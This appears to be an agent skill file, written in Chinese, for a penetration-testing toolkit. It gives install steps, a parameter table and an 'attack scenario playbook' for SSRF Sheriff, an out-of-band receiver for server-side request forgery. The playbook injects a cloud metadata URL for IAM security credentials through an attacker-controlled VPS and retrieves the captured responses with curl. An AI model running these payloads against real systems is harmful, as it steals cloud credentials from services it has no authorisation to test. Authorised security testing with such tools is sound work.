---
name: ssrf-sheriff-oob
description: 渗透工具 skill:SSRF Sheriff 的安装、参数速查与攻击场景 playbook。当任务涉及 Web利用(SSRF) 需要调用 SSRF Sheriff 时使用。
when-to-use: 渗透工具 skill:SSRF Sheriff 的安装、参数速查与攻击场景 playbook。当任务涉及 Web利用(SSRF) 需要调用 SSRF Sheriff 时使用。
---

# SSRF Sheriff

- 攻击大类:C09 Web利用(SSRF)
- 上游仓库:https://github.com/teknogeek/ssrf-sheriff
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
docker run -p 127.0.0.1:8888:8888 -d jaredmauch/ssrf-sheriff
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `http://<vps>:8888/x?u={URL}` | 对外发起请求并记录 |
| `payload: http://<vps>:8888/x?u=http://169.254.169.254/` | 云元数据外带 |
| `curl http://<vps>:8888/keys` | 取回触发的 URL 记录 |

## 攻击场景 Playbook

### 云元数据 SSRF 外带

```bash
# 参数注入 http://vps:8888/x?u=http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://vps:8888/keys  # 查看完整触发的 URL+响应
```

## 注意事项

自建 OOB 接收端,专为 SSRF 探测设计,记录外部触发的完整请求。
